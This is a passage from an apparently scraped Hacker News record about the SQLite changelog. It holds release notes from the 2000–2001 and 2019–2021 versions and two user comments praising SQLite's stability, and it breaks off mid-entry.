to what it was for alpha-1 Fixes to the rollback and locking behavior 2001-09-20 (2.0-alpha-2) Initial release of version 2.0. The idea of renaming the library to \"SQLus\" was abandoned in favor of keeping the \"SQLite\" name and bumping the major version number. The pager and btree subsystems added back. They are now the only available backend. The Dbbe abstraction and the GDBM and memory drivers were removed. Copyright on all code was disclaimed. The library is now in the public domain. 2001-07-23 (1.0.32) Pager and btree subsystems removed. These will be used in a follow-on SQL server library named \"SQLus\". Add the ability to use quoted strings as table and column names in expressions. 2001-04-15 (1.0.31) Pager subsystem added but not yet used. More robust handling of out-of-memory errors. New tests added to the test suite. 2001-04-06 (1.0.30) Remove the sqlite_encoding TCL variable that was introduced in the previous version. Add options -encoding and -tcl-uses-utf to the sqlite TCL command. Add tests to make sure that tclsqlite was compiled using Tcl header files and libraries that match. 2001-04-05 (1.0.29) The library now assumes data is stored as UTF-8 if the --enable-utf8 option is given to configure. The default behavior is to assume iso8859-x, as it has always done. This only makes a difference for LIKE and GLOB operators and the LENGTH and SUBSTR functions. If the library is not configured for UTF-8 and the Tcl library is one of the newer ones that uses UTF-8 internally, then a conversion from UTF-8 to iso8859 and back again is done inside the TCL interface. 2001-04-04 (1.0.28) Added limited support for transactions. At this point, transactions will do table locking on the GDBM backend. There is no support (yet) for rollback or atomic commit. Added special column names ROWID, OID, and _ROWID_ that refer to the unique random integer key associated with every row of every table. Additional tests added to the regression suite to cover the new ROWID feature and the TCL interface bugs mentioned below. Changes to the Lemon parser generator to help it work better when compiled using MSVC. Bug fixes in the TCL interface identified by Oleg Oleinick. 2001-03-20 (1.0.27) When doing DELETE and UPDATE, the library used to write the record numbers of records to be deleted or updated into a temporary file. This is changed so that the record numbers are held in memory. The DELETE command without a WHILE clause just removes the database files from the disk, rather than going through and deleting record by record. 2001-03-20 (1.0.26) A serious bug fixed on Windows. Windows users should upgrade. No impact to Unix. 2001-03-15 (1.0.25) Modify the test scripts to identify tests that depend on system load and processor speed and to warn the user that a failure of one of those (rare) tests does not necessarily mean the library is malfunctioning. No changes to code. 2001-03-14 (1.0.24) Fix a bug which was causing the UPDATE command to fail on systems where \"malloc(0)\" returns NULL. The problem does not appear on Windows, Linux, or HPUX but does cause the library to fail on QNX. 2001-02-20 (1.0.23) An unrelated (and minor) bug from Mark Muranwski fixed. The algorithm for figuring out where to put temporary files for a \"memory:\" database was not working quite right. 2001-02-19 (1.0.22) The previous fix was not quite right. This one seems to work better. 2001-02-19 (1.0.21) The UPDATE statement was not working when the WHERE clause contained some terms that could be satisfied using indices and other terms that could not. Fixed. 2001-02-11 (1.0.20) Merge development changes into the main trunk. Future work toward using a BTree file structure will use a separate CVS source tree. This CVS tree will continue to support the GDBM version of SQLite only. 2001-02-06 (1.0.19) Fix a strange (but valid) C declaration that was causing problems for QNX. No logical changes. 2001-01-04 (1.0.18) Print the offending SQL statement when an error occurs. Do not require commas between constraints in CREATE TABLE statements. Added the \"-echo\" option to the shell. Changes to comments. 2000-12-10 (1.0.17) Rewrote sqlite_complete() to make it faster. Minor tweaks to other code to make it run a little faster. Added new tests for sqlite_complete() and for memory leaks. 2000-11-28 (1.0.16) Documentation updates. Mostly fixing of typos and spelling errors. 2000-10-23 (1.0.15) Documentation updates Some sanity checking code was removed from the inner loop of vdbe.c to help the library to run a little faster. The code is only removed if you compile with -DNDEBUG. 2000-10-19 (1.0.14) Added a \"memory:\" backend driver that stores its database in an in-memory hash table. 2000-10-19 (1.0.13) Break out the GDBM driver into a separate file in anticipation to added new drivers. Allow the name of a database to be prefixed by the driver type. For now, the only driver type is \"gdbm:\". 2000-10-17 (1.0.12) Fixed an off-by-one error that was causing a coredump in the '%q' format directive of the new sqlite_..._printf() routines. Added the sqlite_interrupt() interface. In the shell, sqlite_interrupt() is invoked when the user presses Control-C Fixed some instances where sqlite_exec() was returning the wrong error code. 2000-10-11 (1.0.10) Added notes on how to compile for Windows95/98. Removed a few variables that were not being used. Etc. 2000-10-09 (1.0.9) Added the sqlite_..._printf() interface routines. Modified the sqlite shell program to use the new interface routines. Modified the sqlite shell program to print the schema for the built-in SQLITE_MASTER table, if explicitly requested. 2000-09-30 (1.0.8) Begin writing documentation on the TCL interface. 2000-09-29 (Not Released) Added the sqlite_get_table() API Updated the documentation for due to the above change. Modified the sqlite shell to make use of the new sqlite_get_table() API in order to print a list of tables in multiple columns, similar to the way \"ls\" prints filenames. Modified the sqlite shell to print a semicolon at the end of each CREATE statement in the output of the \".schema\" command. 2000-09-21 (Not Released) Change the tclsqlite \"eval\" method to return a list of results if no callback script is specified. Change tclsqlite.c to use the Tcl_Obj interface Add tclsqlite.c to the libsqlite.a library 2000-09-14 (1.0.5) Changed the print format for floating point values from \"%g\" to \"%.15g\". Changed the comparison function so that numbers in exponential notation (ex: 1.234e+05) sort in numerical order. 2000-08-28 (1.0.4) Added functions length() and substr(). Fix a bug in the sqlite shell program that was causing a coredump when the output mode was \"column\" and the first row of data contained a NULL. 2000-08-22 (1.0.3) In the sqlite shell, print the \"Database opened READ ONLY\" message to stderr instead of stdout. In the sqlite shell, now print the version number on initial startup. Add the sqlite_version[] string constant to the library Makefile updates Bug fix: incorrect VDBE code was being generated for the following circumstance: a query on an indexed table containing a WHERE clause with an IN operator that had a subquery on its right-hand side. 2000-08-18 (1.0.1) Fix a bug in the configure script. Minor revisions to the website. 2000-08-17 (1.0) Change the sqlite program so that it can read databases for which it lacks write permission. (It used to refuse all access if it could not write.) 2000-08-09 Treat carriage returns as white space. 2000-08-08 Added pattern matching to the \".table\" command in the \"sqlite\" command shell. 2000-08-04 Documentation updates Added \"busy\" and \"timeout\" methods to the Tcl interface 2000-08-03 File format version number was being stored in sqlite_master.tcl multiple times. This was harmless, but unnecessary. It is now fixed. 2000-08-02 The file format for indices was changed slightly in order to work around an inefficiency that can sometimes come up with GDBM when there are large indices having many entries with the same key. ** Incompatible Change ** 2000-08-01 The parser's stack was overflowing on a very long UPDATE statement. This is now fixed. 2000-07-31 Finish the VDBE tutorial. Added documentation on compiling to WinNT. Fix a configuration program for WinNT. Fix a configuration problem for HPUX. 2000-07-29 Better labels on column names of the result. 2000-07-28 Added the sqlite_busy_handler() and sqlite_busy_timeout() interface. 2000-06-23 Begin writing the VDBE tutorial. 2000-06-21 Clean up comments and variable names. Changes to documentation. No functional changes to the code. 2000-06-19 Column names in UPDATE statements were case sensitive. This mistake has now been fixed. 2000-06-18 Added the concatenate string operator (||) 2000-06-12 Added the fcnt() function to the SQL interpreter. The fcnt() function returns the number of database \"Fetch\" operations that have occurred. This function is designed for use in test scripts to verify that queries are efficient and appropriately optimized. Fcnt() has no other useful purpose, as far as I know. Added a bunch more tests that take advantage of the new fcnt() function. The new tests did not uncover any new problems. 2000-06-08 Added lots of new test cases Fix a few bugs discovered while adding test cases Begin adding lots of new documentation 2000-06-06 Added compound select operators: UNION, UNION ALL, INTERSECT, and EXCEPT Added support for using (SELECT ...) within expressions Added support for IN and BETWEEN operators Added support for GROUP BY and HAVING NULL values are now reported to the callback as a NULL pointer rather than an empty string. 2000-06-03 Added support for default values on columns of a table. Improved test coverage. Fixed a few obscure bugs found by the improved tests. 2000-06-02 All database files to be modified by an UPDATE, INSERT or DELETE are now locked before any changes are made to any files. This makes it safe (I think) to access the same database simultaneously from multiple processes. The code appears stable so we are now calling it \"beta\". 2000-06-01 Better support for file locking so that two or more processes (or threads) can access the same database simultaneously. More work needed in this area, though. 2000-05-31 Added support for aggregate functions (Ex: COUNT(*), MIN(...)) to the SELECT statement. Added support for SELECT DISTINCT ... 2000-05-30 Added the LIKE operator. Added a GLOB operator: similar to LIKE but it uses Unix shell globbing wildcards instead of the '%' and '_' wildcards of SQL. Added the COPY command patterned after PostgreSQL so that SQLite can now read the output of the pg_dump database dump utility of PostgreSQL. Added a VACUUM command that calls the gdbm_reorganize() function on the underlying database files. And many, many bug fixes... 2000-05-29 Initial Public Release of Alpha code ",
          "Glad to see SQLite on then front page -- it's one of the  silent workhorses of the modern programming/database world. It <i>is</i> the most widely deployed database[0]. If you haven't given it a look/aren't interested in it since it seems to be a \"toy\" database (often the \"test\" or \"local\" db for frameworks like rails or django), you owe it to yourself to see what it can really do. Easy to use full text search[1][2], CTEs[3], JSON support via extension[4] (also the extension system is worth looking at[5]) and much much more. There are certainly things that SQLite does <i>not</i> do, and that's well documented too[6].<p>If all this doesn't convince you to <i>use</i> SQLite, it's also one of the most well documented large C codebases that is fantastic to learn from.<p>I'd go as far as to say that many modern startups could get pretty far with SQLite + aggressive caching before even bringing in a big database like Postgres (though with recent deployment/ops advancements it's easier than ever to run postgres).<p>[0]: <a href=\"https://sqlite.org/mostdeployed.html\" rel=\"nofollow\">https://sqlite.org/mostdeployed.html</a><p>[1]: <a href=\"https://www.sqlite.org/fts5.html\" rel=\"nofollow\">https://www.sqlite.org/fts5.html</a><p>[2]: <a href=\"https://sqlite.org/fts3.html\" rel=\"nofollow\">https://sqlite.org/fts3.html</a><p>[3]: <a href=\"https://sqlite.org/lang_with.html\" rel=\"nofollow\">https://sqlite.org/lang_with.html</a><p>[4]: <a href=\"https://www.sqlite.org/json1.html\" rel=\"nofollow\">https://www.sqlite.org/json1.html</a><p>[5]: <a href=\"https://www.sqlite.org/loadext.html\" rel=\"nofollow\">https://www.sqlite.org/loadext.html</a><p>[6]: <a href=\"https://www.sqlite.org/whentouse.html\" rel=\"nofollow\">https://www.sqlite.org/whentouse.html</a>",
          "SQLite is the most stable small DB there is, maybe even the most stable one at all.<p>Our CTO made a cluster wide distributed configuration filesystem[0], started about 9 years ago. For that a local backing store was required, and a a small DB seemed to fit the bill as it should allow to worry less about data safety, when it's really written out, and it could be a general interface which could be swapped out rather easily if required one day.<p>He checked out lots of the then available options, sorry I only remember BerkleyDB and SQLite but there were more.\nAnyway, only SQLite never crashed, had corrupt data when doing weird things with it and was still very fast, just great.<p>Almost 10 years later we still use it, never a single issue with SQLite as the cause - really impressive IMO.<p>[0]: <a href=\"https://git.proxmox.com/?p=pve-cluster.git;a=tree;f=data/src;h=67601f78bf53763092ead57e55ceb1a2428891a2;hb=refs/heads/master\" rel=\"nofollow\">https://git.proxmox.com/?p=pve-cluster.git;a=tree;f=data/src...</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://www.sqlite.org/changes.html",
        "comments.comment_id": [21163614, 21164167],
        "comments.comment_author": ["hardwaresofton", "tlamponi"],
        "comments.comment_descendants": [11, 0],
        "comments.comment_time": [
          "2019-10-05T03:18:52Z",
          "2019-10-05T06:52:32Z"
        ],
        "comments.comment_text": [
          "Glad to see SQLite on then front page -- it's one of the  silent workhorses of the modern programming/database world. It <i>is</i> the most widely deployed database[0]. If you haven't given it a look/aren't interested in it since it seems to be a \"toy\" database (often the \"test\" or \"local\" db for frameworks like rails or django), you owe it to yourself to see what it can really do. Easy to use full text search[1][2], CTEs[3], JSON support via extension[4] (also the extension system is worth looking at[5]) and much much more. There are certainly things that SQLite does <i>not</i> do, and that's well documented too[6].<p>If all this doesn't convince you to <i>use</i> SQLite, it's also one of the most well documented large C codebases that is fantastic to learn from.<p>I'd go as far as to say that many modern startups could get pretty far with SQLite + aggressive caching before even bringing in a big database like Postgres (though with recent deployment/ops advancements it's easier than ever to run postgres).<p>[0]: <a href=\"https://sqlite.org/mostdeployed.html\" rel=\"nofollow\">https://sqlite.org/mostdeployed.html</a><p>[1]: <a href=\"https://www.sqlite.org/fts5.html\" rel=\"nofollow\">https://www.sqlite.org/fts5.html</a><p>[2]: <a href=\"https://sqlite.org/fts3.html\" rel=\"nofollow\">https://sqlite.org/fts3.html</a><p>[3]: <a href=\"https://sqlite.org/lang_with.html\" rel=\"nofollow\">https://sqlite.org/lang_with.html</a><p>[4]: <a href=\"https://www.sqlite.org/json1.html\" rel=\"nofollow\">https://www.sqlite.org/json1.html</a><p>[5]: <a href=\"https://www.sqlite.org/loadext.html\" rel=\"nofollow\">https://www.sqlite.org/loadext.html</a><p>[6]: <a href=\"https://www.sqlite.org/whentouse.html\" rel=\"nofollow\">https://www.sqlite.org/whentouse.html</a>",
          "SQLite is the most stable small DB there is, maybe even the most stable one at all.<p>Our CTO made a cluster wide distributed configuration filesystem[0], started about 9 years ago. For that a local backing store was required, and a a small DB seemed to fit the bill as it should allow to worry less about data safety, when it's really written out, and it could be a general interface which could be swapped out rather easily if required one day.<p>He checked out lots of the then available options, sorry I only remember BerkleyDB and SQLite but there were more.\nAnyway, only SQLite never crashed, had corrupt data when doing weird things with it and was still very fast, just great.<p>Almost 10 years later we still use it, never a single issue with SQLite as the cause - really impressive IMO.<p>[0]: <a href=\"https://git.proxmox.com/?p=pve-cluster.git;a=tree;f=data/src;h=67601f78bf53763092ead57e55ceb1a2428891a2;hb=refs/heads/master\" rel=\"nofollow\">https://git.proxmox.com/?p=pve-cluster.git;a=tree;f=data/src...</a>"
        ],
        "id": "b7c59b90-8aa6-4c3f-bfcb-a76f60774499",
        "url_text": "Small. Fast. Reliable.Choose any three. This page provides a high-level summary of changes to SQLite. For more detail, see the Fossil checkin logs at http://www.sqlite.org/src/timeline and http://www.sqlite.org/src/timeline?t=release. See the chronology a succinct listing of releases. 2021-06-18 (3.36.0) Improvement to the EXPLAIN QUERY PLAN output to make it easier to understand. Byte-order marks at the start of a token are skipped as if they were whitespace. An error is raised on any attempt to access the rowid of a VIEW or subquery. Formerly, the rowid of a VIEW would be indeterminate and often would be NULL. The -DSQLITE_ALLOW_ROWID_IN_VIEW compile-time option is available to restore the legacy behavior for applications that need it. The sqlite3_deserialize() and sqlite3_serialize() interfaces are now enabled by default. The -DSQLITE_ENABLE_DESERIALIZE compile-time option is no longer required. Instead, there is is a new -DSQLITE_OMIT_DESERIALIZE compile-time option to omit those interfaces. The \"memdb\" VFS now allows the same in-memory database to be shared among multiple database connections in the same process as long as the database name begins with \"/\". Back out the EXISTS-to-IN optimization (item 8b in the SQLite 3.35.0 change log) as it was found to slow down queries more often than speed them up. Improve the constant-propagation optimization so that it works on non-join queries. The REGEXP extension is now included in CLI builds. Hashes: SQLITE_SOURCE_ID: 2021-06-18 18:36:39 5c9a6c06871cb9fe42814af9c039eb6da5427a6ec28f187af7ebfb62eafa66e5 SHA3-256 for sqlite3.c: 2a8e87aaa414ac2d45ace8eb74e710935423607a8de0fafcb36bbde5b952d157 2021-04-19 (3.35.5) Fix defects in the new ALTER TABLE DROP COLUMN feature that could corrupt the database file. Fix an obscure query optimizer problem that might cause an incorrect query result. Hashes: SQLITE_SOURCE_ID: 2021-04-19 18:32:05 1b256d97b553a9611efca188a3d995a2fff712759044ba480f9a0c9e98fae886 SHA3-256 for sqlite3.c: e42291343e8f03940e57fffcf1631e7921013b94419c2f943e816d3edf4e1bbe 2021-04-02 (3.35.4) Fix a defect in the query planner optimization identified by item 8b above. Ticket de7db14784a08053. Fix a defect in the new RETURNING syntax. Ticket 132994c8b1063bfb. Fix the new RETURNING feature so that it raises an error if one of the terms in the RETURNING clause references a unknown table, instead of silently ignoring that error. Fix an assertion associated with aggregate function processing that was incorrectly triggered by the push-down optimization. Hashes: SQLITE_SOURCE_ID: 2021-04-02 15:20:15 5d4c65779dab868b285519b19e4cf9d451d50c6048f06f653aa701ec212df45e SHA3-256 for sqlite3.c: 528b8a26bf5ffd4c7b4647b5b799f86e8fb1a075f715b87a414e94fba3d09dbe 2021-03-26 (3.35.3) Enhance the OP_OpenDup opcode of the bytecode engine so that it works even if the cursor being duplicated itself came from OP_OpenDup. Fix for ticket bb8a9fd4a9b7fce5. This problem only came to light due to the recent MATERIALIZED hint enhancement. When materializing correlated common table expressions, do so separately for each use case, as that is required for correctness. This fixes a problem that was introduced by the MATERIALIZED hint enhancement. Fix a problem in the filename normalizer of the unix VFS. Fix the \"box\" output mode in the CLI so that it works with statements that returns one or more rows of zero columns (such as PRAGMA incremental_vacuum). Forum post afbbcb5b72. Improvements to error messages generated by faulty common table expressions. Forum post aa5a0431c99e. Fix some incorrect assert() statements. Fix to the SELECT statement syntax diagram so that the FROM clause syntax is shown correctly. Forum post 9ed02582fe. Fix the EBCDIC character classifier so that it understands newlines as whitespace. Forum post 58540ce22dcd. Improvements the xBestIndex method in the implementation of the (unsupported) wholenumber virtual table extension so that it does a better job of convincing the query planner to avoid trying to materialize a table with an infinite number of rows. Forum post b52a020ce4. Hashes: SQLITE_SOURCE_ID: 2021-03-26 12:12:52 4c5e6c200adc8afe0814936c67a971efc516d1bd739cb620235592f18f40be2a SHA3-256 for sqlite3.c: 91ca6c0a30ebfdba4420bb35f4fd9149d13e45fc853d86ad7527db363e282683 2021-03-17 (3.35.2) Fix a problem in the appendvfs.c extension that was introduced into version 3.35.0. Ensure that date/time functions with no arguments (which generate responses that depend on the current time) are treated as non-deterministic functions. Ticket 2c6c8689fb5f3d2f Fix a problem in the sqldiff utility program having to do with unusual whitespace characters in a virtual table definition. Limit the new UNION ALL optimization described by item 8c in the 3.35.0 release so that it does not try to make too many new subqueries. See forum thread 140a67d3d2 for details. Hashes: SQLITE_SOURCE_ID: 2021-03-17 19:07:21 ea80f3002f4120f5dcee76e8779dfdc88e1e096c5cdd06904c20fd26d50c3827 SHA3-256 for sqlite3.c: e8edc7b1512a2e050d548d0840bec6eef83cc297af1426c34c0ee8720f378a11 2021-03-15 (3.35.1) Fix a bug in the new DROP COLUMN feature when used on columns that are indexed and that are quoted in the index definition. Improve the built-in documentation for the .dump command in the CLI. Hashes: SQLITE_SOURCE_ID: 2021-03-15 16:53:57 aea12399bf1fdc76af43499d4624c3afa17c3e6c2459b71c195804bb98def66a SHA3-256 for sqlite3.c: fc79e27fd030226c07691b7d7c23aa81c8d46bc3bef5af39060e1507c82b0523 2021-03-12 (3.35.0) Added built-in SQL math functions(). (Requires the -DSQLITE_ENABLE_MATH_FUNCTIONS compile-time option.) Added support for ALTER TABLE DROP COLUMN. Generalize UPSERT: Allow multiple ON CONFLICT clauses that are evaluated in order, The final ON CONFLICT clause may omit the conflict target and yet still use DO UPDATE. Add support for the RETURNING clause on DELETE, INSERT, and UPDATE statements. Use less memory when running VACUUM on databases containing very large TEXT or BLOB values. It is no longer necessary to hold the entire TEXT or BLOB in memory all at once. Add support for the MATERIALIZED and NOT MATERIALIZED hints when specifying common table expressions. The default behavior was formerly NOT MATERIALIZED, but is now changed to MATERIALIZED for CTEs that are used more than once. The SQLITE_DBCONFIG_ENABLE_TRIGGER and SQLITE_DBCONFIG_ENABLE_VIEW settings are modified so that they only control triggers and views in the main database schema or in attached database schemas and not in the TEMP schema. TEMP triggers and views are always allowed. Query planner/optimizer improvements: Enhancements to the min/max optimization so that it works better with the IN operator and the OP_SeekScan optimization of the previous release. Attempt to process EXISTS operators in the WHERE clause as if they were IN operators, in cases where this is a valid transformation and seems likely to improve performance. Allow UNION ALL sub-queries to be flattened even if the parent query is a join. Use an index, if appropriate, on IS NOT NULL expressions in the WHERE clause, even if STAT4 is disabled. Expressions of the form \"x IS NULL\" or \"x IS NOT NULL\" might be converted to simply FALSE or TRUE, if \"x\" is a column that has a \"NOT NULL\" constraint and is not involved in an outer join. Avoid checking foreign key constraints on an UPDATE statement if the UPDATE does not modify any columns associated with the foreign key. Allow WHERE terms to be pushed down into sub-queries that contain window functions, as long as the WHERE term is made up of entirely of constants and copies of expressions found in the PARTITION BY clauses of all window functions in the sub-query. CLI enhancements: Enhance the \".stats\" command to accept new arguments \"stmt\" and \"vmstep\", causing prepare statement statistics and only the virtual-machine step count to be shown, respectively. Add the \".filectrl data_version\" command. Enhance the \".once\" and \".output\" commands so that if the destination argument begins with \"|\" (indicating that output is redirected into a pipe) then the argument does not need to be quoted. Bug fixes: Fix a potential NULL pointer dereference when processing a syntactically incorrect SELECT statement with a correlated WHERE clause and a \"HAVING 0\" clause. (Also fixed in the 3.34.1 patch release.) Fix a bug in the IN-operator optimization of version 3.33.0 that can cause an incorrect answer. Fix incorrect answers from the LIKE operator if the pattern ends with \"%\" and there is an \"ESCAPE '_'\" clause. Hashes: SQLITE_SOURCE_ID: 2021-03-12 15:10:09 acd63062eb06748bfe9e4886639e4f2b54ea6a496a83f10716abbaba4115500b SHA3-256 for sqlite3.c: 73a740d881735bef9de7f7bce8c9e6b9e57fe3e77fa7d76a6e8fc5c262fbaedf 2021-01-20 (3.34.1) Fix a potential use-after-free bug when processing a a subquery with both a correlated WHERE clause and a \"HAVING 0\" clause and where the parent query is an aggregate. Fix documentation typos Fix minor problems in extensions. Hashes: SQLITE_SOURCE_ID: 2021-01-20 14:10:07 10e20c0b43500cfb9bbc0eaa061c57514f715d87238f4d835880cd846b9ebd1f SHA3-256 for sqlite3.c: 799a7be90651fc7296113b641a70b028c142d767b25af1d0a78f93dcf1a2bf20 2020-12-01 (3.34.0) Added the sqlite3_txn_state() interface for reporting on the current transaction state of the database connection. Enhance recursive common table expressions to support two or more recursive terms as is done by SQL Server, since this helps make queries against graphs easier to write and faster to execute. Improved error messages on CHECK constraint failures. CLI enhancements: The .read dot-command now accepts a pipeline in addition to a filename. Added options --data-only and --nosys to the .dump dot-command. Added the --nosys option to the .schema dot-command. Table name quoting works correctly for the .import dot-command. The generate_series(START,END,STEP) table-valued function extension is now built into the CLI. The .databases dot-command now shows the status of each database file as determined by sqlite3_db_readonly() and sqlite3_txn_state(). Added the --tabs command-line option that sets .mode tabs. The --init option reports an error if the file named as its argument cannot be opened. The --init option also now honors the --bail option. Query planner improvements: Improved estimates for the cost of running a DISTINCT operator. When doing an UPDATE or DELETE using a multi-column index where only a few of the earlier columns of the index are useful for the index lookup, postpone doing the main table seek until after all WHERE clause constraints have been evaluated, in case those constraints can be covered by unused later terms of the index, thus avoiding unnecessary main table seeks. The new OP_SeekScan opcode is used to improve performance of multi-column index look-ups when later columns are constrained by an IN operator. The BEGIN IMMEDIATE and BEGIN EXCLUSIVE commands now work even if one or more attached database files are read-only. Enhanced FTS5 to support trigram indexes. Improved performance of WAL mode locking primitives in cases where there are hundreds of connections all accessing the same database file at once. Enhanced the carray() table-valued function to include a single-argument form that is bound using the auxiliary sqlite3_carray_bind() interface. The substr() SQL function can now also be called \"substring()\" for compatibility with SQL Server. The syntax diagrams are now implemented as Pikchr scripts and rendered as SVG for improved legibility and ease of maintenance. Hashes: SQLITE_SOURCE_ID: 2020-12-01 16:14:00 a26b6597e3ae272231b96f9982c3bcc17ddec2f2b6eb4df06a224b91089fed5b SHA3-256 for sqlite3.c: fbd895b0655a337b2cd657675f314188a4e9fe614444cc63dfeb3f066f674514 2020-08-14 (3.33.0) Support for UPDATE FROM following the PostgreSQL syntax. Increase the maximum size of database files to 281 TB. Extended the PRAGMA integrity_check statement so that it can optionally be limited to verifying just a single table and its indexes, rather than the entire database file. Added the decimal extension for doing arbitrary-precision decimal arithmetic. Enhancements to the ieee754 extension for working with IEEE 754 binary64 numbers. CLI enhancements: Added four new output modes: \"box\", \"json\", \"markdown\", and \"table\". The \"column\" output mode automatically expands columns to contain the longest output row and automatically turns \".header\" on if it has not been previously set. The \"quote\" output mode honors \".separator\" The decimal extension and the ieee754 extension are built-in to the CLI Query planner improvements: Add the ability to find a full-index-scan query plan for queries using INDEXED BY which previously would fail with \"no query solution\". Do a better job of detecting missing, incomplete, and/or dodgy sqlite_stat1 data and generates good query plans in spite of the misinformation. Improved performance of queries like \"SELECT min(x) FROM t WHERE y IN (?,?,?)\" assuming an index on t(x,y). In WAL mode, if a writer crashes and leaves the shm file in an inconsistent state, subsequent transactions are now able to recover the shm file even if there are active read transactions. Before this enhancement, shm file recovery that scenario would result in an SQLITE_PROTOCOL error. Hashes: SQLITE_SOURCE_ID: 2020-08-14 13:23:32 fca8dc8b578f215a969cd899336378966156154710873e68b3d9ac5881b0ff3f SHA3-256 for sqlite3.c: d00b7fffa6d33af2303430eaf394321da2960604d25a4471c7af566344f2abf9 2020-06-18 (3.32.3) Various minor bug fixes including fixes for tickets 8f157e8010b22af0, 9fb26d37cefaba40, e367f31901ea8700, b706351ce2ecf59a, 7c6d876f84e6e7e2, and c8d3b9f0a750a529. Hashes: SQLITE_SOURCE_ID: 2020-06-18 14:00:33 7ebdfa80be8e8e73324b8d66b3460222eb74c7e9dfd655b48d6ca7e1933cc8fd SHA3-256 for sqlite3.c: b62b77ee1c561a69a71bb557694aaa5141f1714c1ff6cc1ba8aa8733c92d4f52 2020-06-04 (3.32.2) Fix a long-standing bug in the byte-code engine that can cause a COMMIT command report as success when in fact it failed to commit. Ticket 810dc8038872e212 Hashes: SQLITE_SOURCE_ID: 2020-06-04 12:58:43 ec02243ea6ce33b090870ae55ab8aa2534b54d216d45c4aa2fdbb00e86861e8c SHA3-256 for sqlite3.c: f17a2a57f7eebc72d405f3b640b4a49bcd02364a9c36e04feeb145eccafa3f8d 2020-05-25 (3.32.1) Fix two long-standing bugs that allow malicious SQL statements to crash the process that is running SQLite. These bugs were announced by a third-party approximately 24 hours after the 3.32.0 release but are not specific to the 3.32.0 release. Other minor compiler-warning fixes and whatnot. Hashes: SQLITE_SOURCE_ID: 2020-05-25 16:19:56 0c1fcf4711a2e66c813aed38cf41cd3e2123ee8eb6db98118086764c4ba83350 SHA3-256 for sqlite3.c: f695ae21abf045e4ee77980a67ab2c6e03275009e593ee860a2eabf840482372 2020-05-22 (3.32.0) Added support for approximate ANALYZE using the PRAGMA analysis_limit command. Added the bytecode virtual table. Add the checksum VFS shim to the set of run-time loadable extensions included in the source tree. Added the iif() SQL function. INSERT and UPDATE statements now always apply column affinity before computing CHECK constraints. This bug fix could, in theory, cause problems for legacy databases with unorthodox CHECK constraints the require the input type for an INSERT is different from the declared column type. See ticket 86ba67afafded936 for more information. Added the sqlite3_create_filename(), sqlite3_free_filename(), and sqlite3_database_file_object() interfaces to better support of VFS shim implementations. Increase the default upper bound on the number of parameters from 999 to 32766. Added code for the UINT collating sequence as an optional loadable extension. Enhancements to the CLI: Add options to the .import command: --csv, --ascii, --skip The .dump command now accepts multiple LIKE-pattern arguments and outputs the union of all matching tables. Add the .oom command in debugging builds Add the --bom option to the .excel, .output, and .once commands. Enhance the .filectrl command to support the --schema option. The UINT collating sequence extension is automatically loaded The ESCAPE clause of a LIKE operator now overrides wildcard characters, so that the behavior matches what PostgreSQL does. SQLITE_SOURCE_ID: 2020-05-22 17:46:16 5998789c9c744bce92e4cff7636bba800a75574243d6977e1fc8281e360f8d5a SHA3-256 for sqlite3.c: 33ed868b21b62ce1d0352ed88bdbd9880a42f29046497a222df6459fc32a356f 2020-01-27 (3.31.1) Revert the data layout for an internal-use-only SQLite data structure. Applications that use SQLite should never reference internal SQLite data structures, but some do anyhow, and a change to one such data structure in 3.30.0 broke a popular and widely-deployed application. Reverting that change in SQLite, at least temporarily, gives developers of misbehaving applications time to fix their code. Fix a typos in the sqlite3ext.h header file that prevented the sqlite3_stmt_isexplain() and sqlite3_value_frombind() interfaces from being called from run-time loadable extensions. Hashes: SQLITE_SOURCE_ID: 2020-01-27 19:55:54 3bfa9cc97da10598521b342961df8f5f68c7388fa117345eeb516eaa837bb4d6 SHA3-256 for sqlite3.c: de465c64f09529429a38cbdf637acce4dfda6897f93e3db3594009e0fed56d27 2020-01-22 (3.31.0) Add support for generated columns. Add the sqlite3_hard_heap_limit64() interface and the corresponding PRAGMA hard_heap_limit command. Enhance the function_list pragma to show the number of arguments on each function, the type of function (scalar, aggregate, window), and the function property flags SQLITE_DETERMINISTIC, SQLITE_DIRECTONLY, SQLITE_INNOCUOUS, and/or SQLITE_SUBTYPE. Add the aggregated mode feature to the DBSTAT virtual table. Add the SQLITE_OPEN_NOFOLLOW option to sqlite3_open_v2() that prevents SQLite from opening symbolic links. Added the \"#-N\" array notation for JSON function path arguments. Added the SQLITE_DBCONFIG_TRUSTED_SCHEMA connection setting which is also controllable via the new trusted_schema pragma and at compile-time using the -DSQLITE_TRUSTED_SCHEMA compile-time option. Added APIs sqlite3_filename_database(), sqlite3_filename_journal(), and sqlite3_filename_wal() which are useful for specialized extensions. Add the sqlite3_uri_key() interface. Upgraded the sqlite3_uri_parameter() function so that it works with the rollback journal or WAL filename in addition to the database filename. Provide the ability to tag application-defined SQL functions with new properties SQLITE_INNOCUOUS or SQLITE_DIRECTONLY. Add new verbs to sqlite3_vtab_config() so that the xConnect method of virtual tables can declare the virtual table as SQLITE_VTAB_INNOCUOUS or SQLITE_VTAB_DIRECTONLY. Faster response to sqlite3_interrupt(). Added the uuid.c extension module implementing functions for processing RFC-4122 UUIDs. The lookaside memory allocator is enhanced to support two separate memory pools with different sized allocations in each pool. This allows more memory allocations to be covered by lookaside while at the same time reducing the heap memory usage to 48KB per connection, down from 120KB. The legacy_file_format pragma is deactivated. It is now a no-op. In its place, the SQLITE_DBCONFIG_LEGACY_FILE_FORMAT option to sqlite3_db_config() is provided. The legacy_file_format pragma is deactivated because (1) it is rarely useful and (2) it is incompatible with VACUUM in schemas that have tables with both generated columns and descending indexes. Ticket 6484e6ce678fffab Hashes: SQLITE_SOURCE_ID: 2020-01-22 18:38:59 f6affdd41608946fcfcea914ece149038a8b25a62bbe719ed2561c649b86d824 SHA3-256 for sqlite3.c: a5fca0b9f8cbf80ac89b97193378c719d4af4b7d647729d8df9c0c0fca7b1388 2019-10-10 (3.30.1) Fix a bug in the query flattener that might cause a segfault for nested queries that use the new FILTER clause on aggregate functions. Ticket 1079ad19993d13fa Cherrypick fixes for other obscure problems found since the 3.30.0 release Hashes: SQLITE_SOURCE_ID: 2019-10-10 20:19:45 18db032d058f1436ce3dea84081f4ee5a0f2259ad97301d43c426bc7f3df1b0b SHA3-256 for sqlite3.c: f96fafe4c110ed7d77fc70a7d690e5edd1e64fefb84b3b5969a722d885de1f2d 2019-10-04 (3.30.0) Add support for the FILTER clause on aggregate functions. Add support for the NULLS FIRST and NULLS LAST syntax in ORDER BY clauses. The index_info and index_xinfo pragmas are enhanced to 